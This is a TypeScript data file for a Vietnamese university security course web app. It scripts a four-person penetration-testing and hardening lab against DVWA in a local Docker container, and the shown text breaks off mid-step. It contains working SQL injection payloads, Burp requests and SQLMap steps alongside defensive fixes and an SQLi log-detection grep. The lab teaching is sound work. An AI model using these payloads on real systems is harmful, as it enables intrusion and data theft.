import {
  AttackStage,
  LabWorkspaceState,
  QaItem,
  ScenarioStep,
  TeamMember,
  VulnerabilityItem,
} from "@/types/scenario";

export const PROJECT_OVERVIEW = {
  courseTitle: "Học phần: Kiểm thử & An toàn Hệ thống Web (ATTT)",
  projectTitle: "Kiểm thử Hộp đen (Black-Box) & Kiểm toán Hộp trắng (White-Box) Hệ thống Web DVWA",
  subtitle:
    "Mô phỏng quy trình kiểm thử xâm nhập (Black-Box), kiểm toán mã nguồn & cơ sở dữ liệu (White-Box) và triển khai các giải pháp phòng thủ chiều sâu trên hệ thống mục tiêu DVWA, chia rõ từng bước thực hành cho 4 thành viên.",
  targetSystem: "Damn Vulnerable Web Application (DVWA) — Docker image vulnerables/web-dvwa (Apache/2.4.25 Debian + PHP + MariaDB)",
  methodology: "PTES (Penetration Testing Execution Standard) + White-Box Source/DB Audit + Defense-in-Depth (OWASP Top 10 A03:2021 - Injection)",
  recordedDate: "04/11/2026",
  toolkit: [
    {
      name: "Docker (DVWA)",
      role: "Máy chủ Mục tiêu (Target Server)",
      config: "Container ID: 215d3a734374 hoặc --name dvwa | 0.0.0.0:8080->80/tcp",
      outcome: "Vận hành Apache/2.4.25 (Debian) + PHP + MariaDB cô lập 100%",
    },
    {
      name: "Nmap & cURL + grep",
      role: "Trinh sát & Tự động bóc tách CLI",
      config: "Terminal (zsh / bash)",
      outcome: "Quét cổng 8080, thu thập HTTP Header (PoC 1) & lọc HTML bằng regex (PoC 2)",
    },
    {
      name: "Burp Suite Community",
      role: "Trạm Đánh chặn & Thao túng Gói tin",
      config: "Proxy Listener: 127.0.0.1:8081 | Định tuyến: localtest.me:8080",
      outcome: "Bắt gói HTTP GET, trích PHPSESSID, kiểm chứng lỗi & bản vá (PoC 2 & 5)",
    },
    {
      name: "SQLMap & MariaDB CLI",
      role: "Khai thác Tự động & Kiểm toán Hộp trắng",
      config: "sqlmap (--batch) + docker exec mysql/php",
      outcome: "Dump CSDL, bẻ khóa MD5, vá Bcrypt, phân quyền DB & kiểm toán PHP (PoC 3 & 4)",
    },
  ],
};

export const INFRA_CHALLENGES = [
  {
    id: "port-conflict",
    title: "1. Xử lý Xung đột Cổng (Port Conflict 8080 vs 8081)",
    problem:
      "Container Docker DVWA đã chiếm dụng cổng 8080 (0.0.0.0:8080->80/tcp), khiến Proxy mặc định của Burp Suite (cũng dùng 8080) không thể khởi động song song.",
    solution:
      "Chuyển Proxy Listener của Burp Suite sang 127.0.0.1:8081 (Proxy -> Proxy settings) để trạm đánh chặn và máy chủ web chạy đồng thời không xung đột.",
  },
  {
    id: "loopback-bypass",
    title: "2. Vượt Cơ chế Loopback Bypass của Trình duyệt Chromium",
    problem:
      "Trình duyệt tích hợp trong Burp Suite (Chromium) mặc định bỏ qua Proxy đối với lưu lượng gửi tới 127.0.0.1 hoặc localhost, làm tab Proxy Intercept không bắt được gói tin.",
    solution:
      "Sử dụng tên miền phân giải nội bộ http://localtest.me:8080 (trỏ về 127.0.0.1) để buộc trình duyệt định tuyến 100% gói tin HTTP đi qua Proxy Burp Suite ở cổng 8081.",
  },
];

export const ATTACK_FLOW_STAGES: AttackStage[] = [
  {
    stage: 1,
    badge: "GIAI ĐOẠN 1 • TRINH SÁT & HẠ TẦNG",
    title: "Setup Lab Docker & Trinh sát Bề mặt (PoC 1)",
    owner_member: 1,
    tools: "Docker CLI, Nmap, cURL",
    action: "Kiểm tra container DVWA, quét dịch vụ cổng 8080 bằng Nmap (-sV) và thu thập HTTP Header qua cURL.",
    output: "Phát hiện Server: Apache/2.4.25 (Debian) (CWE-200) và Cookie PHPSESSID / security=low thiếu HttpOnly, SameSite=Strict (CWE-614).",
    handoff: "Chuyển sang máy kiểm thử mở trình duyệt qua cổng Proxy 8081 với localtest.me:8080.",
    poc_label: "PoC 1 + Vá Apache Banner",
  },
  {
    stage: 2,
    badge: "GIAI ĐOẠN 2 • ĐÁNH CHẶN & KHAI THÁC THỦ CÔNG",
    title: "Burp Suite Repeater, cURL + grep & Log Forensics (PoC 2)",
    owner_member: 2,
    tools: "Burp Suite Community, cURL + grep, Apache access.log",
    action: "Đánh chặn GET /vulnerabilities/sqli/, chèn payload ' và ' OR '1'='1 trên Repeater, trích PHPSESSID đưa vào cURL + grep.",
    output: "MariaDB báo lỗi cú pháp You have an error in your SQL syntax... near '''1''' (CWE-89, CVSS 8.8), bóc tách được First name: admin và truy vết IoC trong access.log.",
    handoff: "Nạp URL mục tiêu + chuỗi Cookie PHPSESSID vào SQLMap để tự động hóa khai thác.",
    poc_label: "PoC 2 + Log Forensics",
  },
  {
    stage: 3,
    badge: "GIAI ĐOẠN 3 • KHAI THÁC TỰ ĐỘNG & KIỂM TOÁN CSDL",
    title: "SQLMap 3 Lệnh, MariaDB CLI & Vá Mật mã học (PoC 3)",
    owner_member: 3,
    tools: "SQLMap, MariaDB CLI (mysql), PHP CLI",
    action: "Chạy chuỗi 3 lệnh SQLMap (--dbs, --tables, --dump), kiểm toán bảng users bằng mysql root, vá Bcrypt và tạo user dvwa_svc.",
    output: "Phát hiện 5 tài khoản băm MD5 không Salt (admin và smithy trùng 5f4dcc3b5aa765d61d8327deb882cf99 -> password, CWE-759). Nâng cấp sang Bcrypt cost=12 & Least Privilege.",
    handoff: "Đi sâu kiểm toán mã nguồn PHP 4 cấp độ để tìm nguyên nhân gốc rễ và kiểm chứng bản vá.",
    poc_label: "PoC 3 + Bcrypt & Least Privilege",
  },
  {
    stage: 4,
    badge: "GIAI ĐOẠN 4 • KIỂM TOÁN CODE, BẢN VÁ & WAF",
    title: "Code PHP 4 Cấp, Kiểm chứng PoC 5 & Luật WAF (PoC 4 & 5)",
    owner_member: 4,
    tools: "Docker cat -n, Burp Suite Repeater, ModSecurity CRS",
    action: "So sánh low.php, medium.php, high.php, impossible.php; test PoC 5 gốc (302 Found) và PoC 5 tinh chỉnh (có user_token); cấu hình SecRule WAF.",
    output: "Chứng minh cơ chế bảo vệ 3 lớp của impossible.php (checkToken + is_numeric + PDO Prepared Statements) vô hiệu hóa 100% SQLi và chặn tầng biên bằng HTTP 403.",
    handoff: "Hoàn thiện Hồ sơ Kiểm toán & Phòng ngự Chiều sâu (Defense-in-Depth).",
    poc_label: "PoC 4, PoC 5 + WAF Rule",
  },
];

export const CODE_COMPARISON_TABLE = [
  {
    criterion: "Thư viện kết nối CSDL",
    low: "mysqli (Gọi hàm thủ tục truyền thống)",
    impossible: "PDO (PHP Data Objects hướng đối tượng)",
  },
  {
    criterion: "Cách xử lý tham số $id",
    low: "Nối chuỗi trực tiếp: \"...WHERE user_id = '$id'\" (Dòng 8)",
    impossible: "Tham số hóa với Placeholder: \"...WHERE user_id = (:id)\" (Dòng 13)",
  },
  {
    criterion: "Kiểm tra kiểu dữ liệu",
    low: "Không kiểm tra (Chấp nhận mọi chuỗi ký tự từ $_REQUEST)",
    impossible: "Kiểm tra kép bằng is_numeric($id) (Dòng 11) và ép kiểu PDO::PARAM_INT (Dòng 14)",
  },
  {
    criterion: "Bảo vệ chống CSRF",
    low: "Không có",
    impossible: "Kiểm tra nghiêm ngặt qua hàm checkToken() (Dòng 5), trả về 302 Found nếu vi phạm",
  },
  {
    criterion: "Xử lý lỗi (Error Handling)",
    low: "In thẳng lỗi MariaDB ra màn hình qua mysqli_error() (Dòng 9)",
    impossible: "Ẩn hoàn toàn lỗi hệ thống, không tiết lộ cấu trúc bảng",
  },
  {
    criterion: "Khả năng chống SQLi",
    low: "0% (Bị bẻ gãy cấu trúc truy vấn)",
    impossible: "100% (Tách biệt hoàn toàn Lệnh và Dữ liệu)",
  },
];

export const PHP_LEVEL_SOURCES = [
  {
    level: "low",
    title: "low.php — Nối chuỗi trực tiếp (Lỗ hổng 100%)",
    badge: "0% An toàn • CWE-89",
    severity: "critical" as const,
    summary:
      "Nhận thẳng $_REQUEST['id'] (dòng 5), ghép trực tiếp vào chuỗi SQL WHERE user_id = '$id' (dòng 8) và xuất thẳng lỗi MariaDB bằng mysqli_error() (dòng 9).",
    code: ` 3  if( isset( $_REQUEST[ 'Submit' ] ) ) {
 4      // Get input
 5      $id = $_REQUEST[ 'id' ];
 6
 7      // Check database
 8      $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
 9      $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );`,
    highlightLines: [5, 8, 9],
    bypassDemo: "Payload: 1' OR '1'='1  -->  SELECT ... WHERE user_id = '1' OR '1'='1';",
  },
  {
    level: "medium",
    title: "medium.php — Sanitization vô hiệu do thiếu dấu nháy",
    badge: "Bị bypass • Lỗi kiến trúc",
    severity: "high" as const,
    summary:
      "Dùng mysqli_real_escape_string() để thoát dấu nháy đơn trên $_POST['id'], nhưng câu truy vấn viết WHERE user_id = $id không có dấu nháy bao quanh. SQL coi $id là biểu thức số học, làm hàm lọc dấu nháy trở nên vô hiệu.",
    code: `// Trich doan phan tich kien truc medium.php
$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $_POST['id']);
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);`,
    highlightLines: [2, 3],
    bypassDemo: "Payload không cần dấu nháy: 1 OR 1=1  -->  WHERE user_id = 1 OR 1=1;",
  },
  {
    level: "high",
    title: "high.php — Bảo vệ giao diện giả tạo (Trust Boundary)",
    badge: "Bị bypass • Trust Boundary",
    severity: "medium" as const,
    summary:
      "Tách bước nhập liệu qua cửa sổ popup và lưu vào $_SESSION['id'], đồng thời thêm LIMIT 1 ở cuối truy vấn. Tuy nhiên vẫn vi phạm ranh giới tin cậy (Trust Boundary) vì nối chuỗi trực tiếp và LIMIT 1 dễ bị vô hiệu bằng ký tự chú thích # hoặc --.",
    code: `// Co che luu tru phien va ghep chuoi trong high.php
$id = $_SESSION['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);`,
    highlightLines: [2, 3],
    bypassDemo: "Payload: ' OR '1'='1' #  -->  cắt bỏ LIMIT 1 ở phía sau.",
  },
  {
    level: "impossible",
    title: "impossible.php — Phòng thủ 3 lớp & PDO Prepared Statements",
    badge: "100% An toàn • Chuẩn OWASP",
    severity: "safe" as const,
    summary:
      "Chặn đứng SQL Injection bằng 3 lớp: (1) checkToken() chống CSRF ở dòng 5, (2) is_numeric($id) xác thực kiểu số ở dòng 11, (3) PDO prepare() + bindParam(':id', $id, PDO::PARAM_INT) ở dòng 13–15 tách biệt hoàn toàn giai đoạn biên dịch SQL và nạp dữ liệu.",
    code: ` 3  if( isset( $_GET[ 'Submit' ] ) ) {
 4      // Check Anti-CSRF token
 5      checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
 6
 7      // Get input
 8      $id = $_GET[ 'id' ];
 9
10      // Was a number entered?
11      if(is_numeric( $id )) {
12          // Check the database
13          $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
14          $data->bindParam( ':id', $id, PDO::PARAM_INT );
15          $data->execute();`,
    highlightLines: [5, 11, 13, 14, 15],
    bypassDemo: "Payload 1' với token hợp lệ -> is_numeric(\"1'\") === false -> không chạm tới CSDL!",
  },
];

export const TEAM_MEMBERS: TeamMember[] = [
  {
    member_number: 1,
    slug: "1",
    display_name: "Thành viên 1 (Người 1)",
    role_title: "Hạ tầng Lab, Trinh sát Bề mặt (PoC 1) & Gia cố Apache",
    device: "MacBook (macOS Apple Silicon)",
    os_env: "macOS Terminal (zsh) + Docker Desktop",
    stage_label: "Giai đoạn 1 • Trinh sát & Gia cố",
    main_practice: "Setup Docker, Trinh sát bằng Nmap & cURL (PoC 1)",
    defense_scope: "Vá lỗi Apache Banner trực tiếp (Live Patching) & Chuẩn hóa CWE / CVSS v3.1",
    overview_summary:
      "Khởi tạo mô hình Lab Docker cô lập, giới thiệu chuẩn PTES kết hợp Black-box & White-box, thực hành quét dịch vụ Nmap và thu thập HTTP Header (PoC 1) bằng cURL, sau đó gia cố trực tiếp cấu hình Apache để ẩn phiên bản.",
    tools: ["Docker CLI (Container 215d3a734374)", "Nmap (-sV -p 8080)", "cURL (zsh)", "Apache security.conf"],
    accent_theme: "cyan",
  },
  {
    member_number: 2,
    slug: "2",
    display_name: "Thành viên 2 (Người 2)",
    role_title: "Đánh chặn Gói tin, Khai thác Thủ công (PoC 2) & Điều tra Log",
    device: "Laptop Windows 1 (Ubuntu VM)",
    os_env: "Ubuntu Terminal + Burp Suite Community",
    stage_label: "Giai đoạn 2 • Đánh chặn & Forensics",
    main_practice: "Burp Suite Repeater, cURL + grep bóc tách dữ liệu (PoC 2)",
    defense_scope: "Điều tra Nhật ký Tấn công Blue Team — Log Forensics (access.log)",
    overview_summary:
      "Xử lý xung đột cổng 8080/8081 và vượt cơ chế Loopback Bypass bằng tên miền localtest.me:8080, thực hành đánh chặn gói tin trên Burp Repeater gây lỗi cú pháp MariaDB, trích xuất tự động bằng cURL + grep và phân tích dấu vết IoC trong access.log.",
    tools: ["Burp Suite Community (Proxy 8081)", "Chromium (localtest.me:8080)", "cURL + grep", "Apache access.log"],
    accent_theme: "amber",
  },
  {
    member_number: 3,
    slug: "3",
    display_name: "Thành viên 3 (Người 3)",
    role_title: "Khai thác Tự động SQLMap, Kiểm toán CSDL (PoC 3) & Vá Mật mã học",
    device: "Laptop Windows 2 (Ubuntu VM)",
    os_env: "Ubuntu Terminal + SQLMap + Container MariaDB & PHP CLI",
    stage_label: "Giai đoạn 3 • SQLMap & CSDL",
    main_practice: "SQLMap 3 lệnh tự động & Kiểm toán hộp trắng MariaDB CLI (PoC 3)",
    defense_scope: "Vá lỗi 1 (Băm Bcrypt cost=12) & Vá lỗi 2 (Phân quyền DB tối thiểu dvwa_svc)",
    overview_summary:
      "Tự động hóa khai thác bằng chuỗi 3 lệnh SQLMap (--dbs, --tables, --dump), kiểm toán hộp trắng bảng users qua MariaDB CLI để phát hiện lỗi MD5 không Salt (CWE-759, Rainbow Table), sau đó vá trực tiếp bằng Bcrypt và tài khoản dịch vụ Least Privilege.",
    tools: ["SQLMap (--batch)", "MariaDB CLI (mysql -u root)", "PHP CLI (password_hash)", "GRANT Least Privilege"],
    accent_theme: "emerald",
  },
  {
    member_number: 4,
    slug: "4",
    display_name: "Thành viên 4 (Người 4)",
    role_title: "Kiểm toán Code PHP 4 Cấp độ (PoC 4), Kiểm chứng Bản vá (PoC 5) & WAF",
    device: "Laptop Windows 3 (Ubuntu VM)",
    os_env: "Ubuntu Terminal + Burp Suite Repeater + ModSecurity CRS",
    stage_label: "Giai đoạn 4 • Code Audit & WAF",
    main_practice: "Kiểm toán mã nguồn PHP (PoC 4) & Kiểm chứng bản vá PoC 5 trên Repeater",
    defense_scope: "Đối chiếu 4 cấp độ PHP, PoC 5 tinh chỉnh với user_token & Luật WAF ModSecurity",
    overview_summary:
      "Phân tích nguyên nhân gốc rễ qua 4 cấp độ PHP (low/medium/high/impossible), chứng minh 3 lớp phòng thủ trên PoC 5 gốc (302 Found) và PoC 5 tinh chỉnh (có user_token), cấu hình luật WAF ModSecurity chặn 403 Forbidden theo chuẩn OWASP A03:2021.",
    tools: ["docker exec cat -n (PHP 4 cấp)", "Burp Suite Repeater (PoC 5)", "WAF ModSecurity SecRule", "OWASP A03:2021"],
    accent_theme: "violet",
  },
];

export const SCENARIO_STEPS: ScenarioStep[] = [
  // ==================== NGUOI 1 ====================
  {
    id: "m1-s1",
    member_number: 1,
    step_order: 1,
    phase_tag: "PHẦN CHÍNH • TRINH SÁT HẠ TẦNG",
    title: "Kiểm tra Hạ tầng Lab Docker & Quét Dịch vụ Mục tiêu bằng Nmap",
    poc_ref: "Hạ tầng • Nmap",
    is_defense: false,
    goal: "Xác nhận container DVWA đang hoạt động ổn định trên cổng 8080 và dùng Nmap (-sV) dò tìm phiên bản dịch vụ Web đang mở trước khi kiểm thử.",
    action_steps: [
      "Mở Terminal (zsh) và đảm bảo Docker Desktop đang chạy container mục tiêu DVWA (ID: 215d3a734374, tên ngẫu nhiên epic_dijkstra).",
      "Gõ lệnh docker ps để kiểm tra trạng thái Up và ánh xạ cổng 0.0.0.0:8080->80/tcp.",
      "Gõ lệnh nmap -sV -p 8080 127.0.0.1 để quét đúng cổng 8080 và xác định banner dịch vụ (Apache httpd).",
      "Nếu chưa cài Nmap trên macOS, cài nhanh bằng lệnh: brew install nmap.",
    ],
    commands: [
      {
        label: "Kiểm tra Container DVWA & Quét cổng bằng Nmap",
        shell: "zsh / bash",
        template: `docker ps
nmap -sV -p 8080 127.0.0.1`,
        explanation:
          "Tham số -sV dò phiên bản dịch vụ đang lắng nghe; -p 8080 giới hạn chỉ quét vào cổng web mục tiêu để tiết kiệm thời gian.",
      },
    ],
    expected_output: `CONTAINER ID   IMAGE                  COMMAND      STATUS       PORTS                    NAMES
215d3a734374   vulnerables/web-dvwa   "/main.sh"   Up 2 hours   0.0.0.0:8080->80/tcp     epic_dijkstra

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.25 ((Debian))`,
    academic_explanation:
      "Theo chuẩn PTES (Giai đoạn 1 - Reconnaissance), kiểm thử viên không tấn công mù quáng mà phải xác định chính xác bề mặt dịch vụ (Attack Surface) và công nghệ nền tảng.",
    presenter_script:
      "Quy trình kiểm thử bắt đầu theo chuẩn PTES kết hợp Black-box và White-box trên môi trường Lab Docker cô lập. Bước đầu tiên xác nhận container DVWA đang mở cổng 8080 và dùng Nmap ghi nhận dịch vụ Apache httpd.",
    simulator_key: "m1-recon",
  },
  {
    id: "m1-s2",
    member_number: 1,
    step_order: 2,
    phase_tag: "PHẦN CHÍNH • POC 1",
    title: "Thu thập HTTP Header qua cURL — Phát hiện Lộ Banner & Cookie thiếu cờ",
    poc_ref: "PoC 1 • cURL",
    is_defense: false,
    goal: "Thu thập 15 dòng đầu của phản hồi HTTP từ login.php để phát hiện 2 lỗ hổng bề mặt đầu tiên (PoC 1).",
    action_steps: [
      "Chạy lệnh curl -is http://127.0.0.1:8080/login.php | head -n 15 trên Terminal.",
      "Quan sát dòng Server: để chỉ ra lỗi Server Banner Disclosure (tiết lộ chính xác Apache/2.4.25 và hệ điều hành Debian).",
      "Quan sát 2 dòng Set-Cookie: để chỉ ra PHPSESSID và security=low không có cờ bảo vệ HttpOnly hay SameSite=Strict, đồng thời lưu trạng thái bảo mật ngay phía Client.",
    ],
    commands: [
      {
        label: "Thu thập 15 dòng Header đầu tiên (PoC 1)",
        shell: "zsh / bash",
        template: `curl -is http://127.0.0.1:8080/login.php | head -n 15`,
        explanation:
          "Cờ -i hiển thị HTTP response headers cùng nội dung; -s tắt thanh tiến trình; head -n 15 cắt gọn phần header để lấy bằng chứng báo cáo.",
      },
    ],
    expected_output: `HTTP/1.1 200 OK
Date: Wed, 04 Nov 2026 02:09:19 GMT
Server: Apache/2.4.25 (Debian)
Set-Cookie: PHPSESSID=2d0vvd715drf3nv8mgq7vderg6; path=/
Expires: Tue, 23 Jun 2009 12:00:00 GMT
Cache-Control: no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: security=low
Content-Type: text/html;charset=utf-8`,
    academic_explanation:
      "Phát hiện 2 điểm yếu theo chuẩn quốc tế: (1) Server Banner Disclosure — CWE-200 (CVSS v3.1: 5.3 Medium) giúp kẻ tấn công tra cứu CVE của Apache 2.4.25; (2) Cookie thiếu cờ HttpOnly / SameSite=Strict — CWE-614 (CVSS v3.1: 4.2 Medium) và Client-side Security State (security=low).",
    presenter_script:
      "Qua kết quả PoC 1 từ cURL, hệ thống lộ rõ Server: Apache/2.4.25 (Debian) — mã CWE-200 với điểm CVSS 5.3; đồng thời cấp phát cookie PHPSESSID và security=low thiếu cờ HttpOnly và SameSite=Strict — mã CWE-614, CVSS 4.2.",
    simulator_key: "m1-recon",
  },
  {
    id: "m1-s3",
    member_number: 1,
    step_order: 3,
    phase_tag: "GIA CỐ & PHÒNG THỦ • LIVE PATCHING",
    title: "Vá lỗi 3 Trực tiếp — Gia cố Cấu hình Apache để Ẩn Banner Phiên bản",
    poc_ref: "Vá lỗi 3 • Apache",
    is_defense: true,
    goal: "Chuyển kiến nghị bảo mật thành hành động vá trực tiếp trên container đang chạy, ẩn hoàn toàn số phiên bản 2.4.25 và hệ điều hành Debian.",
    action_steps: [
      "Thực thi lệnh docker exec nối thêm hai chỉ thị ServerTokens Prod và ServerSignature Off vào file /etc/apache2/conf-available/security.conf.",
      "Kích hoạt cấu hình bằng a2enconf security và tải lại dịch vụ Apache (service apache2 reload) không làm gián đoạn container.",
      "Chạy lại curl -Is http://127.0.0.1:8080/login.php | grep -i \"Server:\" để kiểm chứng sau khi vá.",
      "Đối chiếu kết quả: dòng Server chỉ còn hiển thị duy nhất 'Server: Apache'.",
    ],
    commands: [
      {
        label: "Live Patching cấu hình Apache security.conf",
        shell: "zsh / bash",
        template: `docker exec -it {{CONTAINER}} bash -c "cat << 'EOF' >> /etc/apache2/conf-available/security.conf
ServerTokens Prod
ServerSignature Off
EOF
a2enconf security && service apache2 reload"`,
        explanation:
          "ServerTokens Prod ép Apache chỉ trả về tên phần mềm 'Apache' trong HTTP header; ServerSignature Off tắt chữ ký phiên bản ở các trang lỗi 404/500.",
      },
      {
        label: "Kiểm chứng lại HTTP Header sau khi vá",
        shell: "zsh / bash",
        template: `curl -Is http://127.0.0.1:8080/login.php | grep -i "Server:"`,
        explanation: "Chỉ lấy HTTP header (-I) và lọc dòng Server: để xác minh bản vá có hiệu lực ngay lập tức.",
      },
    ],
    expected_output: `Enabling conf security.
Reloading Apache httpd web server: apache2.

Server: Apache`,
    academic_explanation:
      "Thay vì chỉ đề xuất lý thuyết, quá trình gia cố trực tiếp (Live Hardening) trên container giúp triệt tiêu hoàn toàn thông tin phiên bản 2.4.25 và OS Debian trước khi chuyển sang Giai đoạn 2.",
    presenter_script:
      "Để khắc phục ngay lỗ hổng rò rỉ thông tin máy chủ, cấu hình security.conf bên trong container được bổ sung ServerTokens Prod và ServerSignature Off. Khi kiểm tra lại bằng cURL, phản hồi chỉ còn duy nhất 'Server: Apache'.",
    simulator_key: "m1-patch",
  },

  // ==================== NGUOI 2 ====================
  {
    id: "m2-s1",
    member_number: 2,
    step_order: 1,
    phase_tag: "PHẦN CHÍNH • HẠ TẦNG PROXY",
    title: "Cấu hình Burp Suite Proxy 8081 & Vượt Loopback Bypass bằng localtest.me",
    poc_ref: "Burp Proxy • 8081",
    is_defense: false,
    goal: "Thiết lập trạm đánh chặn Burp Suite Community chạy song song với Docker (cổng 8080) và ép trình duyệt Chromium định tuyến 100% gói tin qua Proxy.",
    action_steps: [
      "Mở Burp Suite Community Edition trên máy kiểm thử.",
      "Vào tab Proxy -> Proxy settings -> chọn mục Proxy Listeners -> chỉnh cổng lắng nghe từ 8080 sang 127.0.0.1:8081 (tránh xung đột cổng 8080 của container dvwa).",
      "Bấm nút Open Browser để mở trình duyệt Chromium tích hợp của Burp Suite.",
      "KHÔNG gõ 127.0.0.1:8080 (vì Chromium bỏ qua Proxy cho loopback). Thay vào đó truy cập http://localtest.me:8080, đăng nhập admin / password.",
      "Vào mục DVWA Security ở menu trái -> chọn mức Low -> bấm Submit, sau đó mở mục SQL Injection.",
    ],
    commands: [
      {
        label: "Địa chỉ truy cập trên trình duyệt tích hợp Burp",
        shell: "http",
        template: `http://localtest.me:8080/vulnerabilities/sqli/`,
        explanation:
          "Tên miền localtest.me phân giải về 127.0.0.1 nhưng không nằm trong danh sách ngoại lệ loopback của Chromium, buộc mọi request đi qua Burp Proxy 127.0.0.1:8081.",
      },
    ],
    expected_output: `Proxy Listener Active: 127.0.0.1:8081
DVWA Security Level: low | Username: admin | Route: localtest.me:8080 -> Burp Proxy`,
    academic_explanation:
      "Giải quyết trọn vẹn 2 rào cản kỹ thuật thực tế: (1) Xung đột cổng giữa Docker và Burp đều mặc định 8080; (2) Cơ chế Loopback Bypass của trình duyệt hiện đại.",
    presenter_script:
      "Tiếp nối phần trinh sát, trạm đánh chặn Burp Suite được cấu hình lắng nghe ở cổng 8081 để tránh đụng cổng 8080 của Docker, đồng thời sử dụng tên miền localtest.me:8080 để buộc trình duyệt định tuyến 100% gói tin qua Proxy.",
    simulator_key: "m2-burp",
  },
  {
    id: "m2-s2",
    member_number: 2,
    step_order: 2,
    phase_tag: "PHẦN CHÍNH • POC 2 (PHẦN 1)",
    title: "Đánh chặn Gói tin & Xác nhận Error-based SQLi trên Burp Repeater",
    poc_ref: "PoC 2 • Repeater",
    is_defense: false,
    goal: "Bắt gói tin HTTP GET, trích xuất mã phiên PHPSESSID và gửi payload nháy đơn ' qua Repeater để ép MariaDB nhả lỗi cú pháp SQL.",
    action_steps: [
      "Tại tab Proxy -> Intercept, bật 'Intercept is on'.",
      "Trên trình duyệt, nhập thử số 1 (hoặc ' OR '1'='1) vào ô User ID rồi bấm Submit.",
      "Gói tin GET /vulnerabilities/sqli/?id=1&Submit=Submit bị giữ lại ở Proxy. Nhìn dòng Cookie để lấy chuỗi PHPSESSID (ví dụ: 7nst0hrqrfmv744a5ouj7663b0).",
      "Bấm Ctrl + R (hoặc Cmd + R) gửi gói tin sang tab Repeater, sau đó tắt Intercept is off để trình duyệt không bị treo.",
      "Tại tab Repeater, sửa tham số id= thành dấu nháy đơn ' rồi bấm Send. Quan sát khung Response bên phải báo lỗi MariaDB.",
      "Thử tiếp payload ' OR '1'='1 (hoặc %27+OR+%271%27%3D%271) để chứng minh trích xuất toàn bộ 5 người dùng.",
    ],
    commands: [
      {
        label: "Gói tin HTTP GET kiểm thử Error-based SQLi trên Burp Repeater",
        shell: "http",
        template: `GET /vulnerabilities/sqli/?id=1'&Submit=Submit HTTP/1.1
Host: localtest.me:8080
Cookie: security=low; PHPSESSID={{PHPSESSID}}`,
        explanation:
          "Ký tự nháy đơn (') làm gãy cấu trúc chuỗi '$id' trong câu lệnh SELECT của MariaDB, kích hoạt thông báo lỗi cú pháp trả thẳng về giao diện.",
      },
    ],
    expected_output: `HTTP/1.1 200 OK
Server: Apache/2.4.25 (Debian)
Content-Type: text/html;charset=utf-8

<pre>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''1''' at line 1</pre>`,
    academic_explanation:
      "Xác nhận lỗ hổng Error-based SQL Injection (CWE-89, CVSS v3.1: 8.8 High): dữ liệu đầu vào bị nối trực tiếp vào câu lệnh SQL và thông báo lỗi của MariaDB bị in thẳng ra HTTP Response.",
    presenter_script:
      "Khi đưa gói tin sang Burp Repeater và chèn dấu nháy đơn vào tham số id, máy chủ trả về lỗi cú pháp MariaDB ngay trên giao diện — khẳng định lỗ hổng Error-based SQL Injection mã CWE-89, mức High 8.8 điểm CVSS.",
    simulator_key: "m2-burp",
  },
  {
    id: "m2-s3",
    member_number: 2,
    step_order: 3,
    phase_tag: "PHẦN CHÍNH • POC 2 (PHẦN 2)",
    title: "Tự động hóa Bóc tách Dữ liệu bằng cURL + grep trên Terminal",
    poc_ref: "PoC 2 • cURL",
    is_defense: false,
    goal: "Tái hiện truy vấn từ dòng lệnh bằng PHPSESSID đã lấy từ Burp Suite và dùng biểu thức chính quy grep lọc chính xác tên người dùng từ HTML phức tạp.",
    action_steps: [
      "Mở Terminal trên máy kiểm thử.",
      "Dán giá trị PHPSESSID vừa bắt được trên Burp Suite vào cờ -b của lệnh cURL (lưu ý điền cả security=low).",
      "Ống dẫn (pipe) kết quả HTML qua lệnh grep -o \"First name: [^<]*\" để trích gọn trường dữ liệu mong muốn.",
    ],
    commands: [
      {
        label: "Bóc tách thông tin người dùng qua cURL + grep",
        shell: "zsh / bash",
        template: `curl -s -b "security=low; PHPSESSID={{PHPSESSID}}" \\
  "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" | grep -o "First name: [^<]*"`,
        explanation:
          "Cờ -b đính kèm cookie phiên để vượt qua màn hình đăng nhập DVWA; grep -o chỉ in đúng phần khớp với chuỗi 'First name: ...' cho tới trước thẻ đóng HTML '<'.",
      },
    ],
    expected_output: `First name: admin`,
    academic_explanation:
      "Chứng minh khả năng chuyển đổi từ thao tác trình duyệt thủ công sang kịch bản dòng lệnh (CLI automation), mở đường để bàn giao Cookie phiên cho công cụ SQLMap ở Giai đoạn 3.",
    presenter_script:
      "Từ PHPSESSID bắt được, đưa vào câu lệnh cURL kết hợp regex grep ngay trên Terminal để bóc tách chính xác 'First name: admin' giữa hàng trăm dòng HTML.",
    simulator_key: "m2-curl-log",
  },
  {
    id: "m2-s4",
    member_number: 2,
    step_order: 4,
    phase_tag: "PHÒNG THỦ & ĐIỀU TRA • BLUE TEAM FORENSICS",
    title: "Điều tra Nhật ký Tấn công Apache (Log Forensics)",
    poc_ref: "Forensics • access.log",
    is_defense: true,
    goal: "Đóng vai Blue Team trích xuất và phân tích tệp access.log bên trong container DVWA để chỉ ra các dấu hiệu tấn công (IoC).",
    action_steps: [
      "Chạy lệnh docker exec {{CONTAINER}} grep -E \"(\\%27|\\'|UNION|SELECT)\" /var/log/apache2/access.log | tail -n 5 trên Terminal.",
      "Đọc và phân tích 4 dấu hiệu nhận diện tấn công (Indicators of Compromise - IoC) trên từng dòng log:",
      "1) Địa chỉ IP nguồn thực hiện rà quét; 2) Payload mã hóa URL (%27, UNION, SELECT) nằm trong URI; 3) Chuỗi User-Agent nhận diện công cụ (curl/... vs Mozilla/5.0 Chromium); 4) Mã phản hồi HTTP (200 hoặc 500) và kích thước gói tin bất thường.",
    ],
